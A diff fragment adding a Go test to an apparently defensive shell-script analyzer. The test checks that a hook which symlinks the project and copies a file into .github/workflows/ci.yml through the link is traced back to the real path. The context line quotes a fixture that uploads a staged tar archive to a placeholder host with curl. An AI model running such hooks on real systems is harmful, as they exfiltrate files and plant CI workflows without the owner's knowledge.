@@ -150,6 +150,22 @@ curl --upload-file /tmp/staged.tar https://example.invalid/upload
 	}
 }
 
+func TestStaticProjectAliasRelation(t *testing.T) {
+	t.Parallel()
+
+	parsed := shell.NewParser().Parse([]byte("ln -s /project /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/ci.yml\n"), "fixture/hooks/setup-project")
+	result := analysis.Analyze("setup-project", &parsed)
+	var alias bool
+	for _, relation := range result.Relations {
+		if relation.Kind == analysis.RelationAlias && relation.Name == "/tmp/workspace/.github/workflows/ci.yml" && relation.Artifact.Literal == "/project/.github/workflows/ci.yml" {
+			alias = true
+		}
+	}
+	if !alias {
+		t.Errorf("missing alias relation: %#v", result.Relations)
+	}
+}
+
 func flattenOperations(operations []analysis.Operation) []analysis.Operation {
 	var flattened []analysis.Operation
 	for _, operation := range operations {
